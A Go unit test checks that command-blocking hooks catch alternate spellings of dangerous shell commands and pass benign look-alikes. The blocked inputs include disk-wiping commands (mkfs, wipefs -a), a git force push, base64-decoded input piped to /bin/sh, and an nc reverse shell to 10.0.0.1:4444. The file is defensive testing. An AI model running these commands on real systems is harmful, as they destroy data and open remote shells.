// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package setup

import "testing"

// TestHooks_MoreSpellings checks both hooks on other spellings of commands
// the default rules block.
func TestHooks_MoreSpellings(t *testing.T) {
	runHookRows(t, []hookRow{
		{"mkfs with a type", "mkfs -t ext4 /dev/sdb1", true, false, true, false},
		{"wipefs all", "wipefs -a /dev/sdb", true, false, true, false},
		{"push a plus ref", "git push origin +main", true, false, true, false},
		{"decoded to a shell by path", "echo aGk= | base64 -d | /bin/sh", true, false, true, false},
		{"nc running a command", "nc -c /bin/sh 10.0.0.1 4444", true, false, true, false},
		// Benign twins.
		{"wipefs listing", "wipefs /dev/sdb", false, false, false, false},
		{"push a refspec", "git push origin HEAD:main", false, false, false, false},
		{"decoded to a checksum", "base64 -d x | shasum", false, false, false, false},
		{"nc crlf", "nc -C mail.example.com 25", false, false, false, false},
	})
}
